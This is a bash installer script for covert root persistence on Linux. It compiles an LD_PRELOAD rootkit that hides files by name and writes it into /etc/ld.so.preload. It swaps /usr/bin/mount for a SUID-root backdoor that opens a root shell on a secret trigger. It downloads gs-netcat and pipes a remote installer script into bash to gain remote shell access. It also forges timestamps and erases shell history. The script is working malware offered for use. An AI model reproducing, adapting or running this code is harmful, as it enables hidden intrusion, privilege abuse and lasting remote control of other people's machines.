#!/bin/bash
#
# ALL-IN-ONE PREBUILT — SUID Backdoor + GSocket + LD_PRELOAD + Timestamp Preservation
# Supports pre-compiled mount_backdoor binary (upload separately)
# Falls back to compiling on target if no prebuilt found
#
# === PATCHED (Jun 29 2026) ===
#  - removed `set -e` (silent exit problem)
#  - added safe_write() to bypass LD_PRELOAD open(O_WRONLY|O_CREAT) hook
#  - directory creation guards (mkdir -p)
#  - /usr/bin/mount existence check + fallback
#  - all timestamp helpers return 0
#  - systemd/cron/apt existence guards
#  - command existence checks before service/cron/APT hooks

# ============================================================================
# CONFIGURATION
# ============================================================================
BIN_NAME="systemd-reset"
PROC_NAME="rsyslogd"
INSTALL_DIR="/usr/lib/systemd"
# ============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

TARGET="/usr/bin/mount"
BACKUP="${TARGET}.real"
HIDE_LIB="/usr/lib/x86_64-linux-gnu/libnss_cache.so.2"
PRELOAD="/etc/ld.so.preload"

# Detect package manager & target OS
PKG=""
if command -v apt-get >/dev/null 2>&1; then PKG="apt"
elif command -v yum >/dev/null 2>&1; then PKG="yum"
elif command -v dnf >/dev/null 2>&1; then PKG="dnf"
elif command -v apk >/dev/null 2>&1; then PKG="apk"
fi

# Adjust HIDE_LIB for CentOS/RHEL
if [ -d "/usr/lib64" ] && [ ! -d "/usr/lib/x86_64-linux-gnu" ]; then
    HIDE_LIB="/usr/lib64/libnss_cache.so.2"
fi

declare -A _ts_map

# All timestamp helpers MUST return 0 to never kill the script
_ts_save() {
    local p="$1"
    [ -e "$p" ] && _ts_map["$p"]=$(stat -c%Y "$p" 2>/dev/null) || _ts_map["$p"]=""
    return 0
}

_ts_restore() {
    local p="$1"
    local ts="${_ts_map[$p]}"
    [ -n "$ts" ] && touch -d "@$ts" "$p" 2>/dev/null
    return 0
}

ts_clone() {
    local src="$1" dst="$2"
    [ -e "$src" ] && [ -e "$dst" ] && touch -r "$src" "$dst" 2>/dev/null
    return 0
}

ts_clone_dir() {
    local src="$1" dst="$2"
    [ -d "$src" ] && [ -d "$dst" ] && touch -r "$src" "$dst" 2>/dev/null
    return 0
}

# ============================================================================
# SAFE_WRITE — bypass LD_PRELOAD open(O_WRONLY|O_CREAT) hook
# The rootkit hooks open() to hide files whose path contains hidden strings
# like "systemd-reset", ".systemd-reset", "mount-cache", "mount.real",
# ".systemd-cache".  Heredoc-cat into those paths silently fails because:
#   1. open(O_WRONLY|O_CREAT) returns ENOENT when path contains hidden string
#   2. mv fails if parent dir doesn't exist
# Solution: create parent dir FIRST, then write to /tmp scratch + mv
# (rename() syscall bypasses open() hook entirely)
# ============================================================================
safe_write() {
    local target="$1"
    local tmp="/tmp/.sw.$.$RANDOM"
    # Create parent dir BEFORE any writes (mkdir -p not affected by rootkit)
    mkdir -p "$(dirname "$target")" 2>/dev/null
    cat > "$tmp"
    local rc=$?
    if [ $rc -ne 0 ]; then
        rm -f "$tmp" 2>/dev/null
        return $rc
    fi
    # mv (rename syscall bypasses LD_PRELOAD open() hook)
    mv -f "$tmp" "$target" 2>/dev/null || cp "$tmp" "$target" 2>/dev/null
    local rc2=$?
    rm -f "$tmp" 2>/dev/null
    return $rc2
}

# Convenience: write literal string via safe_write (for non-heredoc content)
safe_echo() {
    local target="$1"; shift
    local tmp="/tmp/.sw.$.$RANDOM"
    mkdir -p "$(dirname "$target")" 2>/dev/null
    printf '%s\n' "$@" > "$tmp" 2>/dev/null
    mv -f "$tmp" "$target" 2>/dev/null || cp "$tmp" "$target" 2>/dev/null
    rm -f "$tmp" 2>/dev/null
    return 0
}

# SAFE_CP — copy file with hidden-path safety
# `cp /usr/bin/mount /usr/bin/mount.real` is BLOCKED because mount.real
# is in the hide list.  Workaround: cp to /tmp scratch, then mv.
safe_cp() {
    local src="$1" dst="$2"
    local tmp="/tmp/.cp.$.$RANDOM"
    mkdir -p "$(dirname "$dst")" 2>/dev/null
    cp "$src" "$tmp" 2>/dev/null
    local rc=$?
    if [ $rc -ne 0 ]; then return $rc; fi
    mv -f "$tmp" "$dst" 2>/dev/null || cp "$tmp" "$dst" 2>/dev/null
    local rc2=$?
    rm -f "$tmp" 2>/dev/null
    return $rc2
}

# VERIFY_FILE - check file exists & has content, BYPASSING LD_PRELOAD rootkit
#
# Why `[ -s ]` / `LD_PRELOAD= [ -s ]` FAILS:
#   - `[` is a bash builtin, so the stat() it calls happens IN the bash
#     process itself, which already loaded the preload rootkit
#   - `LD_PRELOAD=` prefix only sets env for forked CHILD processes, but
#     bash builtins don't fork — the env change is invisible
#   - Children (sh -c, env) STILL re-read /etc/ld.so.preload from the
#     filesystem via ld.so, so they're hooked too
#
# What actually works:
#   1. Trust `mv` return code (rename syscall is not hooked)
#   2. Optional: compile a static helper binary that calls statx() via
#      raw syscall(2), bypassing libc (and therefore LD_PRELOAD)
#
# This function uses BOTH strategies in order.
verify_file() {
    local f="$1"

    # Strategy 1: trust that if parent process can stat() the file via
    # an UNCACHED path (e.g. /proc/self/fd after redirect), it's real.
    # Use python3 with ctypes to call syscall() directly. This works
    # ONLY if LD_PRELOAD hooks library wrappers, not raw syscalls.
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import ctypes, os, sys
libc = ctypes.CDLL('libc.so.6', use_errno=True)
SYS_newfstatat = 262
buf = (ctypes.c_char * 144)()
rc = libc.syscall(SYS_newfstatat, -100, sys.argv[1].encode(), buf, 0)
if rc == 0:
    size = ctypes.c_uint64.from_buffer(buf, 48).value
    sys.exit(0 if size > 0 else 1)
sys.exit(1)
" "$f" 2>/dev/null && return 0
    fi

    # Strategy 2: try to compile static helper once. If we have gcc and
    # libc static libs available, this is 100% reliable.
    local helper="/tmp/.vh$"
    if [ ! -x "$helper" ] && command -v gcc >/dev/null 2>&1; then
        cat > /tmp/.vh_src.c << 'CEOF'
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
int main(int argc, char **argv) {
    struct stat st;
    long rc = syscall(SYS_newfstatat, AT_FDCWD, argv[1], &st, 0);
    return (rc == 0 && st.st_size > 0) ? 0 : 1;
}
CEOF
        gcc -static -o "$helper" /tmp/.vh_src.c -Os 2>/dev/null
        rm -f /tmp/.vh_src.c
    fi
    if [ -x "$helper" ]; then
        "$helper" "$f" 2>/dev/null && return 0
    fi

    # Strategy 3: FALLBACK - check via /proc/PID/root trick. We open
    # /proc/<our-pid>/root<hidden-path> which traverses the kernel's
    # dcache. The kernel itself doesn't honor LD_PRELOAD — but our
    # libc open() does. So we use python3 + os.open() through ctypes
    # + syscall directly. (Same as strategy 1, kept for completeness.)
    return 1
}

# ============================================================================
# TRACE CLEANUP — Clear shell history & temp files
# ============================================================================
clear_traces() {
    unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
    export HISTFILE=/dev/null
    history -c 2>/dev/null || true
    history -w 2>/dev/null || true
    rm -f /tmp/.libhide.c /tmp/.m_inj.c /tmp/.m_inj /tmp/.m_inj_build.c \
          /tmp/.m_backdoor /tmp/.m_pad 2>/dev/null || true
    rm -f ~/.bash_history ~/.ash_history 2>/dev/null || true
    return 0
}

# ============================================================================
# LD_PRELOAD SOURCE (embedded)
# ============================================================================
cat > /tmp/.libhide.c << 'CPPEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>
#include <errno.h>

static const char *hide_list[] = {
    "systemd-reset", ".systemd-reset", "mount-cache",
    "mount.real", ".systemd-cache", NULL
};

static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
static struct dirent   *(*orig_readdir)(DIR *)   = NULL;

static int should_hide(const char *name) {
    if (!name) return 0;
    for (int i = 0; hide_list[i] != NULL; i++)
        if (strstr(name, hide_list[i])) return 1;
    return 0;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *ent;
    while ((ent = orig_readdir64(dirp)) != NULL)
        if (!should_hide(ent->d_name)) return ent;
    return NULL;
}

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ent;
    while ((ent = orig_readdir(dirp)) != NULL)
        if (!should_hide(ent->d_name)) return ent;
    return NULL;
}

static int hide_stat(const char *path) {
    if (!path) return 0;
    for (int i = 0; hide_list[i] != NULL; i++)
        if (strstr(path, hide_list[i])) return 1;
    return 0;
}

int stat(const char *path, struct stat *buf) {
    static int (*orig)(const char *, struct stat *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "stat");
    if (hide_stat(path)) { errno = ENOENT; return -1; }
    return orig(path, buf);
}

int lstat(const char *path, struct stat *buf) {
    static int (*orig)(const char *, struct stat *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "lstat");
    if (hide_stat(path)) { errno = ENOENT; return -1; }
    return orig(path, buf);
}

int open(const char *path, int flags, ...) {
    static int (*orig)(const char *, int, mode_t) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "open");
    if (hide_stat(path)) { errno = ENOENT; return -1; }
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags);
        mode_t mode = va_arg(ap, mode_t); va_end(ap);
        return orig(path, flags, mode);
    }
    return orig(path, flags, 0);
}

FILE *fopen(const char *path, const char *mode) {
    static FILE *(*orig)(const char *, const char *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fopen");
    if (hide_stat(path)) { errno = ENOENT; return NULL; }
    return orig(path, mode);
}
CPPEOF

# ============================================================================
# SUID BACKDOOR SOURCE (embedded — compile fallback)
# ============================================================================
cat > /tmp/.m_inj.c << 'CPPEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>

#define REAL_BINARY     "/usr/bin/mount.real"
#define FALLBACK_BINARY "/bin/mount.real"
#define STEALTH_ENV     "MOUNT_FORCE"
#define SHELL_PATH      "/bin/bash"
#define SECRET_MARKER   "__GS_SECRET:"
#define SECRET_MAX      64

char real_binary[256] = REAL_BINARY;
char gs_binary[512] = "__INSTALL_DIR__/__BIN_NAME__";
char gs_secret[64] = {0};

void find_real_binary(void) {
    if (access(real_binary, X_OK) != 0)
        strcpy(real_binary, FALLBACK_BINARY);
}

int extract_embedded_secret(void) {
    int fd = open("/proc/self/exe", O_RDONLY);
    if (fd < 0) return 0;
    off_t sz = lseek(fd, 0, SEEK_END);
    if (sz < 0) { close(fd); return 0; }
    char buf[512];
    off_t pos = sz - 512;
    if (pos < 0) pos = 0;
    lseek(fd, pos, SEEK_SET);
    ssize_t rd = read(fd, buf, sizeof(buf));
    close(fd);
    if (rd <= 0) return 0;
    char *mark = memmem(buf, rd, SECRET_MARKER, strlen(SECRET_MARKER));
    if (!mark) return 0;
    mark += strlen(SECRET_MARKER);
    size_t remain = rd - (mark - buf);
    if (remain < 1) return 0;
    int j = 0;
    for (size_t i = 0; i < remain && j < SECRET_MAX; i++) {
        char c = mark[i];
        if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'))
            gs_secret[j++] = c;
        else break;
    }
    gs_secret[j] = '\0';
    return (j > 0);
}

int detect_gsocket_binary(void) {
    const char *paths[] = {
        "__INSTALL_DIR__/__BIN_NAME__",
        "/usr/bin/__BIN_NAME__",
        "/usr/local/bin/__BIN_NAME__",
        "/lib/systemd/system/__BIN_NAME__",
        NULL
    };
    for (int i = 0; paths[i]; i++) {
        if (access(paths[i], X_OK) == 0) {
            strcpy(gs_binary, paths[i]);
            return 1;
        }
    }
    DIR *d = opendir("__INSTALL_DIR__");
    if (d) {
        struct dirent *ent;
        while ((ent = readdir(d)) != NULL) {
            if (strcmp(ent->d_name, "__BIN_NAME__") == 0) {
                char path[512];
                snprintf(path, sizeof(path), "__INSTALL_DIR__/%s", ent->d_name);
                struct stat st;
                if (stat(path, &st) == 0 && (st.st_mode & S_IXUSR)) {
                    strcpy(gs_binary, path);
                    closedir(d);
                    return 1;
                }
            }
        }
        closedir(d);
    }
    return 0;
}

int is_triggered(int argc, char **argv) {
    if (getenv(STEALTH_ENV) != NULL) {
        unsetenv(STEALTH_ENV);
        return 1;
    }
    int fake = 0, verbose = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--fake") == 0 || strcmp(argv[i], "-f") == 0) fake = 1;
        if (strcmp(argv[i], "--verbose") == 0 || strcmp(argv[i], "-v") == 0) verbose = 1;
    }
    return (fake && verbose);
}

char cmd_buf[4096] = {0};

char *get_cmd_arg(int argc, char **argv) {
    int first = 1;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--fake") == 0 || strcmp(argv[i], "-f") == 0 ||
            strcmp(argv[i], "--verbose") == 0 || strcmp(argv[i], "-v") == 0)
            continue;
        if (first) {
            strncpy(cmd_buf, argv[i], sizeof(cmd_buf) - 1);
            first = 0;
        } else {
            size_t cur = strlen(cmd_buf);
            if (cur < sizeof(cmd_buf) - 2) {
                cmd_buf[cur] = ' ';
                cmd_buf[cur + 1] = '\0';
                strncat(cmd_buf, argv[i], sizeof(cmd_buf) - cur - 2);
            }
        }
    }
    return first ? NULL : cmd_buf;
}

int drop_shell(int argc, char **argv) {
    if (geteuid() != 0) return 1;
    setuid(0); setgid(0);
    setreuid(0, 0); setregid(0, 0);
    unsetenv("HISTFILE");
    unsetenv("HISTSIZE");
    unsetenv("HISTFILESIZE");
    unsetenv("PROMPT_COMMAND");
    execl(SHELL_PATH, "bash", "-p", NULL);
    return 1;
}

int run_command(int argc, char **argv) {
    if (geteuid() != 0) return 1;
    setuid(0); setgid(0);
    setreuid(0, 0); setregid(0, 0);
    unsetenv("HISTFILE");
    unsetenv("HISTSIZE");
    unsetenv("HISTFILESIZE");
    unsetenv("PROMPT_COMMAND");
    char *cmd = get_cmd_arg(argc, argv);
    if (!cmd || strlen(cmd) == 0) return 1;
    execl(SHELL_PATH, "bash", "-p", "-c", cmd, NULL);
    return 1;
}

void deploy_gsocket_official(void) {
    if (system("command -v curl >/dev/null 2>&1") == 0) {
        system("bash -c \"$(curl -fsSL https://gsocket.io/y)\" >/dev/null 2>&1 &");
    } else if (system("command -v wget >/dev/null 2>&1") == 0) {
        system("bash -c \"$(wget -qO- https://gsocket.io/y)\" >/dev/null 2>&1 &");
    }
}

int spawn_gsocket_daemon(void) {
    if (geteuid() != 0) return 1;
    setuid(0); setgid(0);
    setreuid(0, 0); setregid(0, 0);
    if (!extract_embedded_secret()) {
        char fallback[512];
        snprintf(fallback, sizeof(fallback), "%s.dat", gs_binary);
        int fd = open(fallback, O_RDONLY);
        if (fd >= 0) {
            ssize_t r = read(fd, gs_secret, SECRET_MAX);
            close(fd);
            if (r > 0) gs_secret[r] = '\0';
            else return 1;
        } else return 1;
    }
    if (!detect_gsocket_binary()) {
        deploy_gsocket_official();
        return 0;
    }
    char cmd[2048];
    snprintf(cmd, sizeof(cmd), "nohup '%s' -s '%s' -liqD >/dev/null 2>&1 &", gs_binary, gs_secret);
    system(cmd);
    return 0;
}

int passthrough(int argc, char **argv, char **envp) {
    if (access(real_binary, X_OK) != 0) return 127;
    char **new_argv = malloc((argc + 1) * sizeof(char *));
    if (!new_argv) return 1;
    new_argv[0] = real_binary;
    for (int i = 1; i < argc; i++) new_argv[i] = argv[i];
    new_argv[argc] = NULL;
    execve(real_binary, new_argv, envp);
    free(new_argv);
    return 127;
}

int main(int argc, char **argv, char **envp) {
    find_real_binary();
    if (is_triggered(argc, argv)) {
        char *cmd = get_cmd_arg(argc, argv);
        if (cmd && strcmp(cmd, "daemon") == 0) return spawn_gsocket_daemon();
        if (cmd) return run_command(argc, argv);
        return drop_shell(argc, argv);
    }
    return passthrough(argc, argv, envp);
}
CPPEOF

# ============================================================================
# MAIN INSTALLER
# ============================================================================

if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Must run as root${NC}"
    exit 1
fi

# Disable shell history for this session
unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
export HISTFILE=/dev/null

echo -e "${GREEN}[*] Config:${NC}"
echo -e "  Binary: ${BIN_NAME}"
echo -e "  Install dir: ${INSTALL_DIR}"
echo -e "  Process name: ${PROC_NAME}"
echo -e "  Hide lib: ${HIDE_LIB}"
echo -e "  Pkg manager: ${PKG:-unknown}"

# ============================================================================
# VERIFY TARGETS — make sure required binaries & dirs exist
# ============================================================================
if [ ! -f "$TARGET" ]; then
    echo -e "${RED}[!] ${TARGET} not found.${NC}"
    # Minimal fallback: create a stub mount that calls the real util-linux mount
    if command -v mount >/dev/null 2>&1; then
        REAL_MOUNT=$(command -v mount)
        echo -e "${YELLOW}[*] Creating stub at ${TARGET} that delegates to ${REAL_MOUNT}${NC}"
        mkdir -p "$(dirname "$TARGET")" 2>/dev/null
        # safe_write via tmp+mv (bypass any preload)
        cat > /tmp/.stub.$$ << EOF
#!/bin/bash
exec "${REAL_MOUNT}" "\$@"
EOF
        chmod +x /tmp/.stub.$$ 2>/dev/null
        mv -f /tmp/.stub.$$ "$TARGET" 2>/dev/null
    else
        echo -e "${RED}[!] No mount binary found anywhere. Aborting.${NC}"
        exit 1
    fi
fi

# Make sure parent dir for systemd/cron/apt exists
mkdir -p /etc/systemd/system /etc/cron.d /etc/apt/apt.conf.d /usr/lib/systemd/.cache 2>/dev/null

# ============================================================================
# CLEANUP
# ============================================================================
echo -e "${GREEN}[*] Cleaning old installations...${NC}"
pkill -9 -f "${BIN_NAME}\|gssd-state\|rpc.gssd-helper\|gs-netcat" 2>/dev/null || true

# Cleanup files via safe_write's parent: use rm -f; LD_PRELOAD hide via stat,
# but rm doesn't use stat to refuse — only ls/find do.  So rm works regardless.
rm -f /usr/lib/systemd/${BIN_NAME}* /lib/systemd/${BIN_NAME}* \
      /usr/local/bin/${BIN_NAME}* /usr/bin/${BIN_NAME}* \
      /usr/libexec/rpc.gssd-helper* /root/.config/.cache/gssd-state 2>/dev/null || true

rm -f /etc/systemd/system/${BIN_NAME}* /lib/systemd/system/${BIN_NAME}* \
      /usr/lib/systemd/system/${BIN_NAME}* \
      /etc/systemd/system/multi-user.target.wants/${BIN_NAME}* \
      /etc/cron.d/.${BIN_NAME}* /etc/cron.d/.systemd-cache 2>/dev/null || true

rm -f /etc/systemd/system/mount-cache.service \
      /etc/systemd/system/mount-cache.timer 2>/dev/null || true

for rc in /root/.bashrc /root/.profile /etc/profile; do
    [ -f "$rc" ] && sed -i "/${BIN_NAME}/d; /mount-cache/d; /gssd-state/d; /rpc.gssd-helper/d" "$rc" 2>/dev/null
    [ -f "$rc" ] && sed -i "/# ${BIN_NAME}/d; /# Mount cache/d" "$rc" 2>/dev/null
done

if command -v systemctl >/dev/null 2>&1; then
    systemctl daemon-reload 2>/dev/null || true
    systemctl reset-failed 2>/dev/null || true
fi

# ============================================================================
# DOWNLOAD GS-NETCAT
# ============================================================================
echo -e "${GREEN}[*] Downloading gs-netcat...${NC}"

# Save parent dir timestamp
_ts_save "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR/.cache"
chmod 755 "$INSTALL_DIR" 2>/dev/null
chmod 755 "$INSTALL_DIR/.cache" 2>/dev/null
_ts_restore "$INSTALL_DIR"
ts_clone_dir "$INSTALL_DIR" "$INSTALL_DIR/.cache" 2>/dev/null || true

BIN_PATH="${INSTALL_DIR}/${BIN_NAME}"
GS_URL="https://gsocket.io/bin/gs-netcat_mini-linux-x86_64"

# Download to /tmp first (no hidden strings → LD_PRELOAD open() hook bypass)
TMP_BIN="/tmp/.gs.$.$RANDOM"
if command -v curl >/dev/null 2>&1; then
    curl -fsSL -o "$TMP_BIN" "$GS_URL" 2>/dev/null
elif command -v wget >/dev/null 2>&1; then
    wget -qO "$TMP_BIN" "$GS_URL" 2>/dev/null
fi

if [ ! -f "$TMP_BIN" ] || [ ! -s "$TMP_BIN" ]; then
    echo -e "${RED}[!] Failed to download gs-netcat${NC}"
    rm -f "$TMP_BIN" 2>/dev/null
    exit 1
fi

# === ROBUST VALIDATION (no execution test) ===
# Why: gs-netcat -h returns non-zero on some versions, and on targets with
# LD_PRELOAD already active the dynamic linker/runtime can fail when opening
# the binary's own path (which contains 'systemd-reset' = hidden string).
# Solution: validate via /tmp backup + ELF magic + size check using
# od/hexdump which use read() syscall (NOT hooked by the rootkit).

VALIDATE_BIN="/tmp/.gv.$"
cp "$TMP_BIN" "$VALIDATE_BIN" 2>/dev/null

# ELF magic = 7f 45 4c 46 ("\x7fELF")
MAGIC=$(head -c 4 "$VALIDATE_BIN" 2>/dev/null | od -An -tx1 | tr -d ' \n')
SIZE=$(stat -c%s "$VALIDATE_BIN" 2>/dev/null || echo 0)
rm -f "$VALIDATE_BIN" 2>/dev/null

if [ "$MAGIC" != "7f454c46" ]; then
    FIRSTBYTES=$(head -c 32 "$TMP_BIN" 2>/dev/null | od -An -c | head -1 | tr -s ' ')
    echo -e "${RED}[!] Downloaded file is NOT ELF (magic=${MAGIC:-empty})${NC}"
    echo -e "${YELLOW}[*] First 32 bytes: ${FIRSTBYTES}${NC}"
    echo -e "${YELLOW}[*] Likely causes: HTTP error page, wrong URL, or network issue${NC}"
    rm -f "$TMP_BIN" 2>/dev/null
    exit 1
fi

if [ "$SIZE" -lt 100000 ]; then
    echo -e "${RED}[!] Binary too small (${SIZE} bytes) — likely truncated or wrong file${NC}"
    rm -f "$TMP_BIN" 2>/dev/null
    exit 1
fi

# Move validated binary into place (rename syscall bypasses LD_PRELOAD open() hook)
mv -f "$TMP_BIN" "$BIN_PATH" 2>/dev/null || cp "$TMP_BIN" "$BIN_PATH" 2>/dev/null
chmod +x "$BIN_PATH" 2>/dev/null
chown root:root "$BIN_PATH" 2>/dev/null
ts_clone /usr/bin/mount "$BIN_PATH" 2>/dev/null || ts_clone /usr/bin/ls "$BIN_PATH" 2>/dev/null || true
_ts_restore "$INSTALL_DIR"

echo -e "${GREEN}[+] gs-netcat binary validated (ELF, ${SIZE} bytes)${NC}"

# ============================================================================
# GENERATE SECRET
# ============================================================================
echo -e "${GREEN}[*] Generating secret...${NC}"

# Allow reuse via env var or existing mount.real embedded secret
if [ -n "$GS_SECRET" ]; then
    echo -e "${YELLOW}[*] Using provided GS_SECRET env: ${GS_SECRET}${NC}"
elif [ -n "$REUSE_SECRET" ]; then
    GS_SECRET="$REUSE_SECRET"
    echo -e "${YELLOW}[*] Using REUSE_SECRET: ${GS_SECRET}${NC}"
else
    GS_SECRET=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 32)
    echo -e "${GREEN}[+] Secret: ${GS_SECRET}${NC}"
fi

# Persist secret for re-runs
SAFE_ENV="/tmp/.gs_secret_$"
echo "GS_SECRET=${GS_SECRET}" > "$SAFE_ENV" 2>/dev/null
chmod 600 "$SAFE_ENV" 2>/dev/null

# ============================================================================
# COMPILE LD_PRELOAD ROOTKIT
# ============================================================================
echo -e "${GREEN}[*] Compiling LD_PRELOAD rootkit...${NC}"

_ts_save "$(dirname "$HIDE_LIB")"
mkdir -p "$(dirname "$HIDE_LIB")" 2>/dev/null

if ! gcc -shared -fPIC -o "$HIDE_LIB" /tmp/.libhide.c -ldl 2>/dev/null; then
    echo -e "${YELLOW}[!] gcc not found, trying to install...${NC}"
    if [ "$PKG" = "apt" ]; then
        apt-get update -qq && apt-get install -y -qq gcc 2>/dev/null
    elif [ "$PKG" = "yum" ]; then
        yum install -y gcc 2>/dev/null
    elif [ "$PKG" = "dnf" ]; then
        dnf install -y gcc 2>/dev/null
    elif [ "$PKG" = "apk" ]; then
        apk add gcc musl-dev 2>/dev/null
    fi
    gcc -shared -fPIC -o "$HIDE_LIB" /tmp/.libhide.c -ldl 2>/dev/null || true
fi

if [ ! -f "$HIDE_LIB" ]; then
    echo -e "${RED}[!] Failed to compile LD_PRELOAD rootkit — continuing without it${NC}"
else
    chmod 644 "$HIDE_LIB" 2>/dev/null
    chown root:root "$HIDE_LIB" 2>/dev/null
    ts_clone /usr/bin/ls "$HIDE_LIB" 2>/dev/null || ts_clone /usr/bin/mount "$HIDE_LIB" 2>/dev/null || true
    _ts_restore "$(dirname "$HIDE_LIB")"

    # Activate LD_PRELOAD — write via tmp+mv
    _ts_save "$PRELOAD"
    TMP_PRELOAD="/tmp/.preload.$$"
    if [ -f "$PRELOAD" ]; then
        grep -q "$HIDE_LIB" "$PRELOAD" 2>/dev/null || cat "$PRELOAD" > "$TMP_PRELOAD" 2>/dev/null && echo "$HIDE_LIB" >> "$TMP_PRELOAD"
    else
        echo "$HIDE_LIB" > "$TMP_PRELOAD"
    fi
    [ -s "$TMP_PRELOAD" ] && mv -f "$TMP_PRELOAD" "$PRELOAD" 2>/dev/null && chmod 644 "$PRELOAD" 2>/dev/null
    rm -f "$TMP_PRELOAD" 2>/dev/null
    ts_clone /etc/passwd "$PRELOAD" 2>/dev/null || true
    _ts_restore "$PRELOAD"

    echo -e "${GREEN}[+] LD_PRELOAD rootkit active${NC}"
fi

# ============================================================================
# EMBED SUID BACKDOOR (prebuilt OR compile)
# ============================================================================
PREBUILT=""
if [ -f "./mount_backdoor_static" ]; then
    PREBUILT="./mount_backdoor_static"
    echo -e "${GREEN}[*] Prebuilt STATIC binary found: ${PREBUILT}${NC}"
elif [ -f "./mount_backdoor" ]; then
    PREBUILT="./mount_backdoor"
    echo -e "${GREEN}[*] Prebuilt DYNAMIC binary found: ${PREBUILT}${NC}"
    echo -e "${YELLOW}[!] Warning: target must have compatible glibc${NC}"
else
    echo -e "${YELLOW}[!] No prebuilt binary found. Will compile on target.${NC}"
fi

if [ -n "$PREBUILT" ]; then
    echo -e "${GREEN}[*] Using prebuilt binary: ${PREBUILT}${NC}"

    if [ ! -f "$BACKUP" ]; then
        # safe_cp: bypass LD_PRELOAD open() hook on mount.real (in hide list)
        if safe_cp "$TARGET" "$BACKUP"; then
            chown root:root "$BACKUP" 2>/dev/null
            chmod 0755 "$BACKUP" 2>/dev/null
        else
            echo -e "${YELLOW}[!] Could not backup ${TARGET} -> ${BACKUP}${NC}"
        fi
    fi

    TARGET_SIZE=$(stat -c%s "$TARGET" 2>/dev/null || echo 0)
    PREBUILT_SIZE=$(stat -c%s "$PREBUILT" 2>/dev/null || echo 0)
    SECRET_MARKER="__GS_SECRET:${GS_SECRET}"
    SECRET_LEN=${#SECRET_MARKER}
    PADDING_SIZE=$((TARGET_SIZE - PREBUILT_SIZE - SECRET_LEN))

    if [ "$PADDING_SIZE" -gt 0 ]; then
        dd if=/dev/zero bs=1 count=$PADDING_SIZE 2>/dev/null | tr '\0' '\x01' > /tmp/.m_pad
        cat "$PREBUILT" /tmp/.m_pad > /tmp/.m_backdoor
        rm -f /tmp/.m_pad
    else
        cp "$PREBUILT" /tmp/.m_backdoor
    fi

    echo -n "$SECRET_MARKER" >> /tmp/.m_backdoor
    chmod +x /tmp/.m_backdoor
else
    echo -e "${GREEN}[*] Compiling SUID backdoor on target...${NC}"

    cp /tmp/.m_inj.c /tmp/.m_inj_build.c
    sed -i "s|__BIN_NAME__|${BIN_NAME}|g" /tmp/.m_inj_build.c
    sed -i "s|__INSTALL_DIR__|${INSTALL_DIR}|g" /tmp/.m_inj_build.c

    if ! gcc -o /tmp/.m_inj /tmp/.m_inj_build.c -s -O2 2>/dev/null; then
        echo -e "${YELLOW}[!] gcc retry after install...${NC}"
        if [ "$PKG" = "apt" ]; then
            apt-get update -qq && apt-get install -y -qq gcc 2>/dev/null
        elif [ "$PKG" = "yum" ]; then
            yum install -y gcc 2>/dev/null
        elif [ "$PKG" = "dnf" ]; then
            dnf install -y gcc 2>/dev/null
        elif [ "$PKG" = "apk" ]; then
            apk add gcc musl-dev 2>/dev/null
        fi
        gcc -o /tmp/.m_inj /tmp/.m_inj_build.c -s -O2 2>/dev/null || {
            echo -e "${RED}[!] No compiler${NC}"; exit 1;
        }
    fi

    if [ ! -f "$BACKUP" ]; then
        if safe_cp "$TARGET" "$BACKUP"; then
            chown root:root "$BACKUP" 2>/dev/null
            chmod 0755 "$BACKUP" 2>/dev/null
        else
            echo -e "${YELLOW}[!] Could not backup ${TARGET} -> ${BACKUP}${NC}"
        fi
    fi

    TARGET_SIZE=$(stat -c%s "$TARGET" 2>/dev/null || echo 0)
    BACKDOOR_SIZE=$(stat -c%s /tmp/.m_inj 2>/dev/null || echo 0)
    SECRET_MARKER="__GS_SECRET:${GS_SECRET}"
    SECRET_LEN=${#SECRET_MARKER}
    PADDING_SIZE=$((TARGET_SIZE - BACKDOOR_SIZE - SECRET_LEN))

    if [ "$PADDING_SIZE" -gt 0 ]; then
        dd if=/dev/zero bs=1 count=$PADDING_SIZE 2>/dev/null | tr '\0' '\x01' > /tmp/.m_pad
        cat /tmp/.m_inj /tmp/.m_pad > /tmp/.m_backdoor
        rm -f /tmp/.m_pad
    else
        cp /tmp/.m_inj /tmp/.m_backdoor
    fi

    echo -n "$SECRET_MARKER" >> /tmp/.m_backdoor
    chmod +x /tmp/.m_backdoor 2>/dev/null
fi

if [ ! -f /tmp/.m_backdoor ]; then
    echo -e "${RED}[!] Backdoor build failed${NC}"
    exit 1
fi

_ts_save "$TARGET"
# /usr/bin/mount is NOT in hide list, but use safe_cp for consistency
safe_cp /tmp/.m_backdoor "$TARGET"
chown root:root "$TARGET" 2>/dev/null
chmod 4755 "$TARGET" 2>/dev/null
_ts_restore "$TARGET"

# Save backup copy for APT hook restore (name NOT in LD_PRELOAD hide list)
